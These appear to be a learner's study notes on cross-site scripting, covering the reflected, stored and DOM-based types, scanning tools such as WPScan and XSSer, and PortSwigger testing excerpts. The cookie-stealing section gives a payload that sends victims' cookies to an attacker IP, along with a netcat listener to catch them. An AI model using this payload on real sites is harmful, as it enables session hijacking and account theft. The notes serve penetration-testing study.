### Cross-Site Scripting (XSS)
- It is a client side web vulnerability that allows attackers to inject malicious scripts into web pages.
- It is typically caused by a lack of input sanitization / validation in web applications.
- Attackers leverage XSS Vulnerabilities to inject malicious code into web applications. Because XSS is a client side vulnerability, these scripts are executed by the victim's browser.
- XSS vulnerabilities affect web applications that lack input and leverage client-side scripting languages like JS, Flash, CSS etc.
- XSS Vulnerabilities/attacks are typically sorted into 2 main categories : stored / persistent and reflected.
- XSS Attacks are typically exploited for the following objectives : 
1. Cookie Stealing / Session Hijacking - Stealing cookies from users with authenticated sessions, allowing you to login as other users by leveraging the authentication information contained within a cookie.
2. Browser Exploitation - Exploitation of browser vulnerabilities.
3. Keylogging -  Logging keyboard entries made by other users on a Web Application.
4. Phishing - Injecting fake login forms into a webpage to capture credentials.

### Javascript Primer
- JS is a high level client side scripting language that is commonly used to develop dynamic and interactive web pages and web applications.
- JS is executed by web browser and can interact with the Document Object Model (DOM) to manipulate web page content as well as server-side resources to request data and perform other tasks.
- Browsers executes JS in a low privileged browser sandbox in user space.
**Some Basic JS Payloads / Codes** - 
`<script>alert()</script>` - To generate a Pop-Up Alert in the Browser
`<script>window.location.replace("www.google.com);</script>` - To redirect to the given website.


### Anatomy of a XSS Attack
1. We need to find an input field where we could some sort of data or payload.
2. Try using the application and check how the web application responds to it and what can we conclude out of it.
3. example, if you typed an email and password in the login form and an incorrect attempt was made, but you notice that the email you typed in remained there and just the password disappeared, so here it can have a potential reflected XSS present in the webapp.
4. example, intercept the request and check the parameters you are sending and then check the response, and find the place where your data got passed, how it got passed, what's the reaction of the JS code we entered and what might be results of adding different codes over there?
5. And if we need to check any Reflected XSS, we start with the basic `<script>alert("XSS")</script>`
6. Now, most probably we need to make changes with delimiters and other JS Code that is going to be sanitized for sure, so we'll try to change the start from a delimiter to a `">` or using some other codes that would either close the sanitization of JS Code and further use the `<script>` tag to start the payload. And we could also end our payload with a HTML Comment `<!--` so as to comment out anything that is coming after this payload so as to ensure its execution.

### Reflected XSS
- Reflected XSS is the most common form of XSS and involves tricking a victim into clicking a specially crafted link to the vulnerable website.
- When the victim clicks on the link the website includes the XSS payload as part of the response back to the victim's browser where the payload is executed.
	![[Pasted image 20250125011524.png]]

 Here, we need to check that where exactly does the input we give, gets into the website. So, that we could exploit the website's functionality now.
##### Exploiting Reflected XSS Vulnerabilities in WordPress
Whenever we are trying to exploit a Content Management WordPress Site, it is very much required to know how the website is developed and it's functioning. Also, check all the third party plugins that are used to setup or develop the website.

Install WPScan using the command : `sudo apt-get install wpscan`
We just need to create a Free Account and get the API Token from it.

To use it to scan the website : 
`wpscan --url <url>` - For basic enumeration
`wpscan --url <url> --enumerate p --plugins-detection aggressive` - For Plugin Detection Mode in Aggressive Manner
`wpscan --url <url> --numerate p --plugins-detection aggressive --api-token <token>` - For Vulnerability Scanning
 
Get the name of the vulnerability and search them onto Google.
We can also search that over `searchsploit <Vuln_Name>`
Then we can search that vulnerability in `www.exploit-db.com`


##### Cookie Stealing via Reflected XSS
To get the cookie present in the webpage, we just need to type in the JS command in the XSS vulnerable webpage : `<script>alert(document.cookie)</script>`

Now, we are going to generate a payload to exploit this vulnerability : `<script>new Image().src='http://<ip_address>:4444/?cookie=' + encodeURI(document.cookie);</script>`

For this payload to run, we need to run the Netcat at the same port : `nc -nvlp 4444`


### Stored XSS
- Stored XSS is a vulnerability where an attacker is able to inject JS Code into a Web application's database or source code via an input that is not sanitized.
- For example, if an attacker is able to inject a malicious XSS Payload into a webpage on a website without proper sanitization, the XSS Payload Injected into the webpage will be executed by the browser of anyone that visits that webpage.
	![[Pasted image 20250125011257.png]]

To find a Stored XSS, first we need to find an input option and check if something is getting stored on the webpage, so we need to check with the functionalities of the webpage.

Same check for the Plugins or Information, you have within the webpage. Now, check that with the searchsploit for a common vulnerability for it if you find one.

##### Exploiting Stored XSS Vulnerabilities in MyBB Forum
There is a Github Website for exploitation ; `www.github.com/0xB9/MyBBscan`
Then, run a simple command i.e. `./scan.py`
And simply, we could just give the tool your website and it will produce multiple Possible Vulnerable Plugin.


### DOM-Based XSS
- DOM-based XSS / Type - 0 XSS is a type of XSS vulnerability that allows an attacker to inject malicious payloads into a webpage by exploiting a weakness in the DOM of the web application.
- A DOM-based XSS attack involves exploiting a script on the webpage that takes user input and reflects it back to the page without proper sanitization, the attacker then inject malicious code/payloads into the webpage's DOM by modifying the values of the script's variables.

##### Document Object Model (DOM)
- It is a programming interface for HTML and XML files.
- It represents the webpage as a hierarchical tree-like structure, where each node corresponds to an element, attribute or text in the webpage.
- The DOM is used by developers to dynamically change the context and behavior of a webpage in response to user interaction.
- example - 
1. Add or remove elements and attributes from the page.
2. Change the content of existing elements like text or images.
3. Modify the styling and layout of elements on the page.
4. Respond to user interaction such as clicks or keyboard input.

![[Pasted image 20250125034756.png]]

**Stored vs Reflect vs DOM-based XSS**
1. Stored XSS attacks occur when the attacker injects malicious code into a web application's database or other storage mechanism, such as a comment section or user profile field. The malicious code is then served to all users who view the affected page, regardless of their session or borwser.
2. Reflected XSS attacks are carried out by injecting malicious code into a web application's input field, such as search boxes, forms or URLs. The input is when reflected back to the user in the form of an error message, search results or a page redirect. When the victim clicks on the link or submits the form, the malicious code is executed in their browser.
3. DOM-based XSS attacks occur when the vulnerable code is present in the Document Object Model (DOM) of the webpage. The attacker exploits a weakness in the web application's JS code to modify the values of the script's variables and inject malicious code into the DOM. When the victim loads the webpage, the malicious code is executed in their browser.

### Identifying & Exploiting XSS Vulnerabilities with XSSer
1. Cross Site "Scripter" (aka XSSer) is an automatic framework that can be used to detect, exploit and report XSS vulnerabilities in web-based applications.
2. It contains several options to try to bypass certain filters and various special techniques of code injection.
3. XSSer as pre-installed (> 1300 XSS) attacking vectors and can bypass-exploit code on several browsers/WAFs : www.github.com/epsylon/xsser

To use the tool and get help, use the command : `xsser -h`
To use XSSer to lookup for XSS Vulnerability, we'll use this command : `xsser --url "url" -p "body_of_request"` (In the body of request put XSS where we want to input the XSS Vectors.)
Now, to specify the payload in the XSSer, we'll use the command : `xsser --url "url" -p "body_of_request" --Fp "payload"`

Now, if there would be any kind of possible vulnerability, the tool will provide us with the Attack Vector and then we need to put that Attack Vector into the body of Burp Suite Request.

We can also provide pre-installed Vectors to the tool, using the flag `--auto` in the end.

We can also use a GUI Application for XSSer.


# Portswigger Learnings
## How to test for DOM-based cross-site scripting

The majority of DOM XSS vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner. To test for DOM-based cross-site scripting manually, you generally need to use a browser with developer tools, such as Chrome. You need to work through each available source in turn, and test each one individually.
### Testing HTML sinks

To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as `location.search`), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript. In Chrome's developer tools, you can use `Control+F` (or `Command+F` on MacOS) to search the DOM for your string.

For each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute.

Note that browsers behave differently with regards to URL-encoding, Chrome, Firefox, and Safari will URL-encode `location.search` and `location.hash`, while IE11 and Microsoft Edge (pre-Chromium) will not URL-encode these sources. If your data gets URL-encoded before being processed, then an XSS attack is unlikely to work.

## Exploiting DOM XSS with different sources and sinks

In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. Additionally, the website's scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. There are a variety of sinks that are relevant to DOM-based vulnerabilities. Please refer to the [list](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities) below for details.

The `document.write` sink works with `script` elements, so you can use a simple payload, such as the one below:

`document.write('... <script>alert(document.domain)</script> ...');`